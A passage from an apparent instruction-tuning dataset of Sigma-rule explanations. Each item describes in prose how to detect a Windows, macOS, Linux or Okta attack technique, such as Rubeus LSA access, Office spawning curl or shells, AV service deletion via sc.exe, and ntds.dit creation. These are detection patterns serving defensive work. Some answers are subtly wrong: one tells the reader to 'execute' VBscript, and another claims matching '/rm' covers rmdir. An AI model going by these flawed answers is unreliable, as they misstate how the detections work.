    "output": "In order to detect execution of PowerShell via creation of named pipe starting with PSHost, you should: Focus on monitoring the creation of named pipes in Windows environments, specifically looking for any instances where the pipe name begins with '\\PSHost'. This detection requires you to have logging for Named Pipe Events enabled in your Sysmon configuration, particularly looking out for Event ID 17 and Event ID 18. It's recommended to use or verify against popular Sysmon configurations available online, such as those by SwiftOnSecurity, Neo23x0, or Olaf Hartong. These configurations need to be in place as they are instrumental in capturing the required event data. Testing the detection can be achieved through the use of specific PowerShell scripts designed to simulate named pipe creation that follows the patterns attackers might use. It's important to note that while this method aims to identify malicious activity related to PowerShell execution, the possibility of encountering unknown false positives exists - meaning that not all detections might represent genuine threats. The focus is on providing informational level insights into potential suspicious activities involving PowerShell and named pipes, aiding in the broader strategy of mitigating tactics that involve the execution and automation based on PowerShell scripts, particularly those initiated by adversaries through named pipes that adhere to a naming convention starting with 'PSHost'.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of PowerShell via creation of named pipe starting with PSHost",
      "answer": "In order to detect execution of PowerShell via creation of named pipe starting with PSHost, you should: Focus on monitoring the creation of named pipes in Windows environments, specifically looking for any instances where the pipe name begins with '\\PSHost'. This detection requires you to have logging for Named Pipe Events enabled in your Sysmon configuration, particularly looking out for Event ID 17 and Event ID 18. It's recommended to use or verify against popular Sysmon configurations available online, such as those by SwiftOnSecurity, Neo23x0, or Olaf Hartong. These configurations need to be in place as they are instrumental in capturing the required event data. Testing the detection can be achieved through the use of specific PowerShell scripts designed to simulate named pipe creation that follows the patterns attackers might use. It's important to note that while this method aims to identify malicious activity related to PowerShell execution, the possibility of encountering unknown false positives exists - meaning that not all detections might represent genuine threats. The focus is on providing informational level insights into potential suspicious activities involving PowerShell and named pipes, aiding in the broader strategy of mitigating tactics that involve the execution and automation based on PowerShell scripts, particularly those initiated by adversaries through named pipes that adhere to a naming convention starting with 'PSHost'."
    }
  },
  {
    "instruction": "Can you explain how to detect: The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect attempts where the Rubeus tool might be trying to get a handle to the Local Security Authority (LSA) system process which is a potential indicator of credential theft or Kerberos ticket manipulation, you should: Monitor Windows Security logs for event ID 4673 with a service name indicating a call to 'LsaRegisterLogonProcess()' and specifically look for events marked with failure keywords '0x8010000000000000'. This activity is critical to track as it signifies an application's attempt to verify itself as a logon process, a privilege that should be closely guarded. Such occurrences could potentially be misuse attempts by tools like Rubeus to manipulate authentication processes. It is important to note that the actual intentions behind triggering this event might not always be malicious, and thus, observed incidents could occasionally lead to false positives with unspecified origins. The detection of this behavior is highly relevant for security teams and falls under tactics and techniques associated with credential access and manipulation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA.",
      "answer": "In order to detect attempts where the Rubeus tool might be trying to get a handle to the Local Security Authority (LSA) system process which is a potential indicator of credential theft or Kerberos ticket manipulation, you should: Monitor Windows Security logs for event ID 4673 with a service name indicating a call to 'LsaRegisterLogonProcess()' and specifically look for events marked with failure keywords '0x8010000000000000'. This activity is critical to track as it signifies an application's attempt to verify itself as a logon process, a privilege that should be closely guarded. Such occurrences could potentially be misuse attempts by tools like Rubeus to manipulate authentication processes. It is important to note that the actual intentions behind triggering this event might not always be malicious, and thus, observed incidents could occasionally lead to false positives with unspecified origins. The detection of this behavior is highly relevant for security teams and falls under tactics and techniques associated with credential access and manipulation."
    }
  },
  {
    "instruction": "How to detect: usage of winget to add new additional download sources",
    "context": "",
    "output": "In order to detect usage of winget to add new additional download sources, you should: Monitor process creation logs on Windows systems, specifically looking for the execution of `winget.exe`. This detection focuses on instances where the `Image` path ends with `\\winget.exe` or the `OriginalFileName` is exactly `winget.exe`. Additionally, scrutinize the command line arguments to identify cases where both `source` and `add` are mentioned, indicating an attempt to add new download sources via `winget`. Be aware that there can be legitimate uses of this functionality, so some false positives are expected. This monitoring is considered to be of medium importance.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of winget to add new additional download sources",
      "answer": "In order to detect usage of winget to add new additional download sources, you should: Monitor process creation logs on Windows systems, specifically looking for the execution of `winget.exe`. This detection focuses on instances where the `Image` path ends with `\\winget.exe` or the `OriginalFileName` is exactly `winget.exe`. Additionally, scrutinize the command line arguments to identify cases where both `source` and `add` are mentioned, indicating an attempt to add new download sources via `winget`. Be aware that there can be legitimate uses of this functionality, so some false positives are expected. This monitoring is considered to be of medium importance."
    }
  },
  {
    "instruction": "How can I detect: suspicious child processes spawning from microsoft office suite applications such as word or excel. This could indicates malicious macro execution",
    "context": "",
    "output": "In order to detect suspicious child processes spawning from Microsoft Office suite applications such as Word or Excel, which could indicate malicious macro execution, you should: Monitor your macOS systems for the creation of processes that originate from common Microsoft Office applications (Word, Excel, PowerPoint, OneNote) and subsequently initiate specific scripts or command-line tools. Specifically, be vigilant for the launching of bash, curl, dash, fish, osacompile, osascript, sh, zsh, python, or python3 as child processes of these Office applications. Such occurrences are unusual and may signal an attempt to execute malicious commands or scripts following the enabling of macros or other content. This criteria serves as a red flag, denoting a potentially high-risk activity that necessitates immediate attention.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious child processes spawning from microsoft office suite applications such as word or excel. This could indicates malicious macro execution",
      "answer": "In order to detect suspicious child processes spawning from Microsoft Office suite applications such as Word or Excel, which could indicate malicious macro execution, you should: Monitor your macOS systems for the creation of processes that originate from common Microsoft Office applications (Word, Excel, PowerPoint, OneNote) and subsequently initiate specific scripts or command-line tools. Specifically, be vigilant for the launching of bash, curl, dash, fish, osacompile, osascript, sh, zsh, python, or python3 as child processes of these Office applications. Such occurrences are unusual and may signal an attempt to execute malicious commands or scripts following the enabling of macros or other content. This criteria serves as a red flag, denoting a potentially high-risk activity that necessitates immediate attention."
    }
  },
  {
    "instruction": "Explain how should I detect the following: remote thread creation in \"KeePass.exe\" which could indicates potential password dumping activity",
    "context": "",
    "output": "In order to detect remote thread creation in \"KeePass.exe\" which could indicate potential password dumping activity, you should: Focus on monitoring the creation of remote threads within the Windows environment, specifically targeting instances where these threads are created in the \"KeePass.exe\" process. This activity can be a strong indicator of an adversary attempting to dump or steal passwords stored within KeePass, a well-known password management application. The detection centers around identifying any event where a remote thread is initiated in the KeePass.exe application. Given the sensitivity and potential impact of this behavior, any such detection is treated with a high level of seriousness, although it's important to note that there might be scenarios where these detections could be false positives, although such cases are not specifically known. This vigilance is a part of defending against tactics and techniques that involve credential access and persistence, aiming to mitigate the risks associated with unauthorized access to sensitive information.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "remote thread creation in \"KeePass.exe\" which could indicates potential password dumping activity",
      "answer": "In order to detect remote thread creation in \"KeePass.exe\" which could indicate potential password dumping activity, you should: Focus on monitoring the creation of remote threads within the Windows environment, specifically targeting instances where these threads are created in the \"KeePass.exe\" process. This activity can be a strong indicator of an adversary attempting to dump or steal passwords stored within KeePass, a well-known password management application. The detection centers around identifying any event where a remote thread is initiated in the KeePass.exe application. Given the sensitivity and potential impact of this behavior, any such detection is treated with a high level of seriousness, although it's important to note that there might be scenarios where these detections could be false positives, although such cases are not specifically known. This vigilance is a part of defending against tactics and techniques that involve credential access and persistence, aiming to mitigate the risks associated with unauthorized access to sensitive information."
    }
  },
  {
    "instruction": "Please help me detect the following: creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker.",
    "context": "",
    "output": "Sure!\nIn order to detect the creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process, which is typically generated by Microsoft PowerShell to test against Applocker, you should monitor Windows file event logs for the creation or modification of files containing the name \"__PSScriptPolicyTest_\". It is crucial to exclude events triggered by known and common PowerShell processes, including 'pwsh.exe', 'dsac.exe', 'ServerManager.exe', 'powershell_ise.exe', 'powershell.exe', and 'wsmprovhost.exe' located in their respective system directories within 'Program Files', 'System32', and 'SysWOW64'. These exclusions help in reducing false positives by filtering out legitimate instances of PowerShell use. The detection focuses on identifying potential evasion or bypass attempts of application control policies like Applocker, by pinpointing activities occurring from unusual or unexpected processes which are not typically associated with the generation of this specific PowerShell script file. Monitoring these events at a medium severity level is recommended due to the potential for false positives of unknown origin, yet the creation of such a script by atypical processes can signify malicious intent, such as attempting to assess or circumvent existing security policies.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker.",
      "answer": "In order to detect the creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process, which is typically generated by Microsoft PowerShell to test against Applocker, you should monitor Windows file event logs for the creation or modification of files containing the name \"__PSScriptPolicyTest_\". It is crucial to exclude events triggered by known and common PowerShell processes, including 'pwsh.exe', 'dsac.exe', 'ServerManager.exe', 'powershell_ise.exe', 'powershell.exe', and 'wsmprovhost.exe' located in their respective system directories within 'Program Files', 'System32', and 'SysWOW64'. These exclusions help in reducing false positives by filtering out legitimate instances of PowerShell use. The detection focuses on identifying potential evasion or bypass attempts of application control policies like Applocker, by pinpointing activities occurring from unusual or unexpected processes which are not typically associated with the generation of this specific PowerShell script file. Monitoring these events at a medium severity level is recommended due to the potential for false positives of unknown origin, yet the creation of such a script by atypical processes can signify malicious intent, such as attempting to assess or circumvent existing security policies."
    }
  },
  {
    "instruction": "How to detect: Execute VBscript code that is referenced within the *.bgi file.",
    "context": "",
    "output": "In order to execute VBscript code that is referenced within the *.bgi file, you should monitor the creation of processes on Windows systems, especially focusing on the execution of 'bginfo.exe'. Specifically, look for instances where 'bginfo.exe' is executed with command line parameters that include both '/popup' and '/nolicprompt'. These command line parameters are crucial indicators of the script\u2019s execution attempt without displaying license prompts, potentially for stealthy operations. It's important to note that detecting such activities can be challenging and might result in unknown false positives. The severity of this activity is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Execute VBscript code that is referenced within the *.bgi file.",
      "answer": "In order to execute VBscript code that is referenced within the *.bgi file, you should monitor the creation of processes on Windows systems, especially focusing on the execution of 'bginfo.exe'. Specifically, look for instances where 'bginfo.exe' is executed with command line parameters that include both '/popup' and '/nolicprompt'. These command line parameters are crucial indicators of the script\u2019s execution attempt without displaying license prompts, potentially for stealthy operations. It's important to note that detecting such activities can be challenging and might result in unknown false positives. The severity of this activity is considered medium."
    }
  },
  {
    "instruction": "How can I detect: pattern of UAC Bypass using ICMLuaUtil Elevated COM interface",
    "context": "",
    "output": "In order to detect the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface, you should: Look for the creation of processes on Windows where the parent process is 'dllhost.exe', and the ParentCommandLine includes specific Process IDs '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' or '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'. However, it's important to ignore cases where the new process being created is 'WerFault.exe', whether identified by the process's image ending with '\\WerFault.exe' or by its original file name. This filtering helps in accurately identifying activities associated with UAC Bypass attempts using the ICMLuaUtil Elevated COM interface, minimizing the chances of detecting regular system activities as false positives. The significance of this detection is marked as high due to the potential security breach it represents.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "pattern of UAC Bypass using ICMLuaUtil Elevated COM interface",
      "answer": "In order to detect the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface, you should: Look for the creation of processes on Windows where the parent process is 'dllhost.exe', and the ParentCommandLine includes specific Process IDs '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' or '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'. However, it's important to ignore cases where the new process being created is 'WerFault.exe', whether identified by the process's image ending with '\\WerFault.exe' or by its original file name. This filtering helps in accurately identifying activities associated with UAC Bypass attempts using the ICMLuaUtil Elevated COM interface, minimizing the chances of detecting regular system activities as false positives. The significance of this detection is marked as high due to the potential security breach it represents."
    }
  },
  {
    "instruction": "Can you explain how to detect: Bitsadmin connections to IP addresses instead of FQDN names",
    "context": "",
    "output": "Certainly!\n\nIn order to detect Bitsadmin connections to IP addresses instead of FQDN names, you should: Monitor proxy logs for specific conditions indicating potential malicious activity. Look for user agent strings that start with 'Microsoft BITS/' which denotes the use of the Background Intelligent Transfer Service, a component of Microsoft Windows operating systems that provides asynchronous transfer of files in the background. Additionally, pay close attention to the host names ('cs-host') connected to. If these host names end in a single numeric character ('1' through '9'), it might indicate an attempt to connect to an IP address directly rather than a fully qualified domain name, which is uncommon for legitimate traffic and may signify malicious behavior. Given the unusual nature of these patterns, any detection should be treated with a high level of concern, although it's acknowledged that there may be scenarios where such traffic is benign and results in false positives. The focus on proxy log sources is critical for identifying such connections, which can be associated with various adversarial tactics and techniques, although specific MITRE ATT&CK tags were not provided in this scenario.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Bitsadmin connections to IP addresses instead of FQDN names",
      "answer": "In order to detect Bitsadmin connections to IP addresses instead of FQDN names, you should: Monitor proxy logs for specific conditions indicating potential malicious activity. Look for user agent strings that start with 'Microsoft BITS/' which denotes the use of the Background Intelligent Transfer Service, a component of Microsoft Windows operating systems that provides asynchronous transfer of files in the background. Additionally, pay close attention to the host names ('cs-host') connected to. If these host names end in a single numeric character ('1' through '9'), it might indicate an attempt to connect to an IP address directly rather than a fully qualified domain name, which is uncommon for legitimate traffic and may signify malicious behavior. Given the unusual nature of these patterns, any detection should be treated with a high level of concern, although it's acknowledged that there may be scenarios where such traffic is benign and results in false positives. The focus on proxy log sources is critical for identifying such connections, which can be associated with various adversarial tactics and techniques, although specific MITRE ATT&CK tags were not provided in this scenario."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks",
    "context": "",
    "output": "In order to detect execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks, you should monitor for the creation of processes on Windows systems, paying close attention to any executions of a program named `GUP.exe`. This is particularly important if `GUP.exe` is not running from its conventional location within the Notepad++ program directories, specifically the updater folder located in either the standard `Program Files` or `Program Files (x86)` paths, or within a user's `AppData\\Local` or `AppData\\Roaming` directories under Notepad++'s updater folder.\n\nYou should disregard any instances where `GUP.exe` executes from these known legitimate paths as these can be considered normal behavior and not indicative of a suspicious activity. However, executing from locations outside these paths could potentially signal a DLL side-loading attack, whereby an adversary places a malicious executable in a directory where the system or another program may inadvertently run it, thinking it's the legitimate Notepad++ updater. This method is often exploited to bypass security measures and execute malicious code under the guise of legitimate processes.\n\nTo effectively mitigate false positive alerts, it's important to consider that any `GUP.exe` executions occurring outside of the described Notepad++ updater locations should be investigated, while those within the specified legitimate paths should not trigger an alert, recognizing that `GUP.exe` running from its correct location is expected and not of concern. This vigilant monitoring approach ensures a high level of detection precision for activities associated with DLL side-loading tactics employing the Notepad++ updater as a disguise.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks",
      "answer": "In order to detect execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks, you should monitor for the creation of processes on Windows systems, paying close attention to any executions of a program named `GUP.exe`. This is particularly important if `GUP.exe` is not running from its conventional location within the Notepad++ program directories, specifically the updater folder located in either the standard `Program Files` or `Program Files (x86)` paths, or within a user's `AppData\\Local` or `AppData\\Roaming` directories under Notepad++'s updater folder.\n\nYou should disregard any instances where `GUP.exe` executes from these known legitimate paths as these can be considered normal behavior and not indicative of a suspicious activity. However, executing from locations outside these paths could potentially signal a DLL side-loading attack, whereby an adversary places a malicious executable in a directory where the system or another program may inadvertently run it, thinking it's the legitimate Notepad++ updater. This method is often exploited to bypass security measures and execute malicious code under the guise of legitimate processes.\n\nTo effectively mitigate false positive alerts, it's important to consider that any `GUP.exe` executions occurring outside of the described Notepad++ updater locations should be investigated, while those within the specified legitimate paths should not trigger an alert, recognizing that `GUP.exe` running from its correct location is expected and not of concern. This vigilant monitoring approach ensures a high level of detection precision for activities associated with DLL side-loading tactics employing the Notepad++ updater as a disguise."
    }
  },
  {
    "instruction": "Explain how should I detect the following: creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon parent process or directory",
    "context": "",
    "output": "In order to detect the creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon parent process or directory, you should monitor Windows file events, focusing specifically on instances where a file with the name ending in \"\\ntds.dit\" is created. This file is crucial as it contains the Active Directory database, which stores security and user information for an organization. The creation of this file by unorthodox methods or processes can indicate a security breach or an attack aiming to duplicate or manipulate the Active Directory data.\n\nTo effectively detect such activities, it is important to look out for the file being created by parent processes that are not typically associated with administrative operations on the Active Directory. These processes include 'cscript.exe', 'httpd.exe', 'nginx.exe', 'php-cgi.exe', 'powershell.exe', 'pwsh.exe', 'w3wp.exe', and 'wscript.exe'. Additionally, attention should be drawn to the file being generated from specific directories such as those containing '\\apache', '\\tomcat', '\\AppData\\', '\\Temp\\', '\\Public\\', '\\PerfLogs\\' in their paths. These directories and processes are not usual sources for operations on the Active Directory database, hinting at an underlying malicious intent or unauthorized access.\n\nHowever, it's important to note that detection relies on the \"ParentImage\" field, which isn't available by default in Sysmon Event ID 11. To leverage this detection strategy fully, logs must be enriched with this additional ParentImage data.\n\nThe outlined approach serves to flag potential security incidents where the \"ntds.dit\" file is being manipulated in a manner that deviates from standard administrative protocols, thereby indicating a need for high prioritization and investigation due to the high risk involved.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon parent process or directory",
      "answer": "In order to detect the creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon parent process or directory, you should monitor Windows file events, focusing specifically on instances where a file with the name ending in \"\\ntds.dit\" is created. This file is crucial as it contains the Active Directory database, which stores security and user information for an organization. The creation of this file by unorthodox methods or processes can indicate a security breach or an attack aiming to duplicate or manipulate the Active Directory data.\n\nTo effectively detect such activities, it is important to look out for the file being created by parent processes that are not typically associated with administrative operations on the Active Directory. These processes include 'cscript.exe', 'httpd.exe', 'nginx.exe', 'php-cgi.exe', 'powershell.exe', 'pwsh.exe', 'w3wp.exe', and 'wscript.exe'. Additionally, attention should be drawn to the file being generated from specific directories such as those containing '\\apache', '\\tomcat', '\\AppData\\', '\\Temp\\', '\\Public\\', '\\PerfLogs\\' in their paths. These directories and processes are not usual sources for operations on the Active Directory database, hinting at an underlying malicious intent or unauthorized access.\n\nHowever, it's important to note that detection relies on the \"ParentImage\" field, which isn't available by default in Sysmon Event ID 11. To leverage this detection strategy fully, logs must be enriched with this additional ParentImage data.\n\nThe outlined approach serves to flag potential security incidents where the \"ntds.dit\" file is being manipulated in a manner that deviates from standard administrative protocols, thereby indicating a need for high prioritization and investigation due to the high risk involved."
    }
  },
  {
    "instruction": "How to detect: Obfuscated Powershell via Stdin in Scripts",
    "context": "",
    "output": "In order to detect obfuscated PowerShell via Stdin in scripts, you should focus on monitoring Windows Security Logs, particularly ensuring that the 'System Security Extension' audit subcategory is enabled. This is necessary to capture Event ID 4697, which logs the creation of a new service. The detection should specifically look for service file names containing indications of obfuscation or suspicious activity, such as the use of 'set' in conjunction with '&&', or file names containing the words 'environment', 'invoke', or '${input)'. These indicators suggest an attempt to execute obfuscated commands or scripts, which is a common tactic used in stealthy PowerShell attacks. The detection of these activities is considered of high importance due to the potential severity of PowerShell-based attacks, which can range from unauthorized system access to data exfiltration. Since the method for this detection might also intercept legitimate activities involving complex service creation commands, it's acknowledged that there could be unknown false positives. However, in the context of cybersecurity defenses, the presence of these specific patterns in service file names should prompt a closer investigation, as they commonly relate to malicious attempts to leverage obfuscated PowerShell scripts, aiming to evade detection mechanisms.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via Stdin in Scripts",
      "answer": "In order to detect obfuscated PowerShell via Stdin in scripts, you should focus on monitoring Windows Security Logs, particularly ensuring that the 'System Security Extension' audit subcategory is enabled. This is necessary to capture Event ID 4697, which logs the creation of a new service. The detection should specifically look for service file names containing indications of obfuscation or suspicious activity, such as the use of 'set' in conjunction with '&&', or file names containing the words 'environment', 'invoke', or '${input)'. These indicators suggest an attempt to execute obfuscated commands or scripts, which is a common tactic used in stealthy PowerShell attacks. The detection of these activities is considered of high importance due to the potential severity of PowerShell-based attacks, which can range from unauthorized system access to data exfiltration. Since the method for this detection might also intercept legitimate activities involving complex service creation commands, it's acknowledged that there could be unknown false positives. However, in the context of cybersecurity defenses, the presence of these specific patterns in service file names should prompt a closer investigation, as they commonly relate to malicious attempts to leverage obfuscated PowerShell scripts, aiming to evade detection mechanisms."
    }
  },
  {
    "instruction": "Explain how should I detect the following: when attackers use \"sc.exe\" to delete AV services from the system in order to avoid detection",
    "context": "",
    "output": "In order to detect when attackers use \"sc.exe\" to delete AV services from the system in order to avoid detection, you should: monitor the creation of processes on Windows systems, specifically focusing on instances where the process is linked to \"sc.exe\" (Service Controller) either by the image name ending in '\\sc.exe' or the original filename being 'sc.exe'. Additionally, pay close attention to the command-line arguments accompanying these processes, especially for strings that include 'delete' coupled with names of several prominent antivirus and security services (like AVG Antivirus, Malwarebytes, Sophos, ESET, Kaspersky, Quick Heal, McAfee, Trend Micro, and Panda among others). This combination of process creation tied to \"sc.exe\" and command-line instructions aimed at deleting security services is a strong indicator of malicious activity aimed at disabling protective measures on a system. Be aware, however, that there could be false positives, such as legitimate software uninstallation operations using the same method; these should be carefully filtered out to avoid misinterpretations. This detection is critical and has a high importance level due to the potential for significant security implications if antivirus services are successfully removed, allowing attackers to operate without detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when attackers use \"sc.exe\" to delete AV services from the system in order to avoid detection",
      "answer": "In order to detect when attackers use \"sc.exe\" to delete AV services from the system in order to avoid detection, you should: monitor the creation of processes on Windows systems, specifically focusing on instances where the process is linked to \"sc.exe\" (Service Controller) either by the image name ending in '\\sc.exe' or the original filename being 'sc.exe'. Additionally, pay close attention to the command-line arguments accompanying these processes, especially for strings that include 'delete' coupled with names of several prominent antivirus and security services (like AVG Antivirus, Malwarebytes, Sophos, ESET, Kaspersky, Quick Heal, McAfee, Trend Micro, and Panda among others). This combination of process creation tied to \"sc.exe\" and command-line instructions aimed at deleting security services is a strong indicator of malicious activity aimed at disabling protective measures on a system. Be aware, however, that there could be false positives, such as legitimate software uninstallation operations using the same method; these should be carefully filtered out to avoid misinterpretations. This detection is critical and has a high importance level due to the potential for significant security implications if antivirus services are successfully removed, allowing attackers to operate without detection."
    }
  },
  {
    "instruction": "How to detect: mount of ISO images on an endpoint",
    "context": "",
    "output": "In order to detect the mount of ISO images on an endpoint, you should monitor Windows Security audit logs specifically for events related to the access of removable storage. Focus on capturing events identified by EventID 4663, indicating an object's access attempt. These logs should come from the Security ObjectServer and involve FileType objects. Particularly, pay attention to access attempts involving objects whose names start with '\\Device\\CdRom', as this indicates the interaction with CD-ROM devices, typically used to read ISO images.\n\nHowever, not all access events to CD-ROM devices should be considered suspicious. For instance, accessing the '\\Device\\CdRom0\\setup.exe' path is excluded from detection criteria because it's commonly accessed during legitimate software installations via ISO files. Therefore, while monitoring for the described activities, filter out events involving this specific path to reduce false positives such as those triggered by software installation ISO files.\n\nThis monitoring process is essential for identifying unauthorized or unexpected mount of ISO images, which could be indicative of an attack attempt or unauthorized data retrieval. It's assessed at a medium level of importance due to its potential to catch malicious activities early. Keep an eye out for events meeting these criteria, as they are aligned with the detection of misuse of removable media which relates to several ATT&CK tactics and techniques including Initial Access, Execution, and Persistence, among others.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "mount of ISO images on an endpoint",
      "answer": "In order to detect the mount of ISO images on an endpoint, you should monitor Windows Security audit logs specifically for events related to the access of removable storage. Focus on capturing events identified by EventID 4663, indicating an object's access attempt. These logs should come from the Security ObjectServer and involve FileType objects. Particularly, pay attention to access attempts involving objects whose names start with '\\Device\\CdRom', as this indicates the interaction with CD-ROM devices, typically used to read ISO images.\n\nHowever, not all access events to CD-ROM devices should be considered suspicious. For instance, accessing the '\\Device\\CdRom0\\setup.exe' path is excluded from detection criteria because it's commonly accessed during legitimate software installations via ISO files. Therefore, while monitoring for the described activities, filter out events involving this specific path to reduce false positives such as those triggered by software installation ISO files.\n\nThis monitoring process is essential for identifying unauthorized or unexpected mount of ISO images, which could be indicative of an attack attempt or unauthorized data retrieval. It's assessed at a medium level of importance due to its potential to catch malicious activities early. Keep an eye out for events meeting these criteria, as they are aligned with the detection of misuse of removable media which relates to several ATT&CK tactics and techniques including Initial Access, Execution, and Persistence, among others."
    }
  },
  {
    "instruction": "How can I detect: file deletion using \"rm\", \"shred\" or \"unlink\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity",
    "context": "",
    "output": "In order to detect file deletion using \"rm\", \"shred\" or \"unlink\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity, you should: Focus on Linux-based systems and monitor the creation process logs. Specifically, you should keep an eye out for processes that end with '/rm', which covers the use of both the 'rm' command and its variant 'rmdir', as well as processes that conclude with '/shred' or '/unlink'. These commands are frequently employed by attackers to remove traces of their presence or activities. It's important to note, however, that these commands can also be used for legitimate administrative activities, so some occurrences might be false positives. The information level for this type of detection is classified as informational, indicating that while it's useful for understanding system activity, it should be validated in the context of other suspicious activities to accurately identify malicious behavior.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "file deletion using \"rm\", \"shred\" or \"unlink\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity",
      "answer": "In order to detect file deletion using \"rm\", \"shred\" or \"unlink\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity, you should: Focus on Linux-based systems and monitor the creation process logs. Specifically, you should keep an eye out for processes that end with '/rm', which covers the use of both the 'rm' command and its variant 'rmdir', as well as processes that conclude with '/shred' or '/unlink'. These commands are frequently employed by attackers to remove traces of their presence or activities. It's important to note, however, that these commands can also be used for legitimate administrative activities, so some occurrences might be false positives. The information level for this type of detection is classified as informational, indicating that while it's useful for understanding system activity, it should be validated in the context of other suspicious activities to accurately identify malicious behavior."
    }
  },
  {
    "instruction": "How to detect: when unauthorized access to app occurs.",
    "context": "",
    "output": "In order to detect when unauthorized access to an app occurs, you should focus on monitoring logs from Okta, a widely used identity management service. Specifically, look for log entries indicating that a user attempted to access an application without the proper authorization. This scenario is typically captured in logs with a display message stating \"User attempted unauthorized access to app.\" It is important to understand that sometimes this detection might flag legitimate attempts by users who believed they had access rights to the application, which are identified as possible false positives. This situation is assigned a medium severity level, indicating the need for investigation to confirm whether each incident represents a genuine security threat or a misunderstanding by the user. Monitoring for such unauthorized access attempts is crucial for identifying potential breaches and enforcing application security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when unauthorized access to app occurs.",
      "answer": "In order to detect when unauthorized access to an app occurs, you should focus on monitoring logs from Okta, a widely used identity management service. Specifically, look for log entries indicating that a user attempted to access an application without the proper authorization. This scenario is typically captured in logs with a display message stating \"User attempted unauthorized access to app.\" It is important to understand that sometimes this detection might flag legitimate attempts by users who believed they had access rights to the application, which are identified as possible false positives. This situation is assigned a medium severity level, indicating the need for investigation to confirm whether each incident represents a genuine security threat or a misunderstanding by the user. Monitoring for such unauthorized access attempts is crucial for identifying potential breaches and enforcing application security."
    }
  },
  {
    "instruction": "Can you explain how to detect: changes to the registry keys related to \"Trusted Location\" of Microsoft Office. Attackers might add additional trusted locations to avoid macro security restrictions.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect changes to the registry keys related to \"Trusted Location\" of Microsoft Office, where attackers might add additional trusted locations to avoid macro security restrictions, you should: Focus on monitoring Windows registry activities, specifically looking for events where registry keys under the \"Security\\Trusted Locations\\Location\" path are modified. These modifications are identified by the EventType \"Setvalue\", which indicates a value within a registry key has been changed. Pay particular attention to registry keys that end with '\\Path', as these are directly related to the locations that Microsoft Office considers trusted. It's crucial to note that legitimate office installations or setups may also modify these keys, adding trusted locations and potentially triggering a detection. Therefore, these changes are categorized with a medium level of concern due to possible false positives during such installations or configurations. Continuously monitoring these registry changes can help in identifying unauthorized attempts to bypass macro security restrictions by tampering with trusted locations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "changes to the registry keys related to \"Trusted Location\" of Microsoft Office. Attackers might add additional trusted locations to avoid macro security restrictions.",
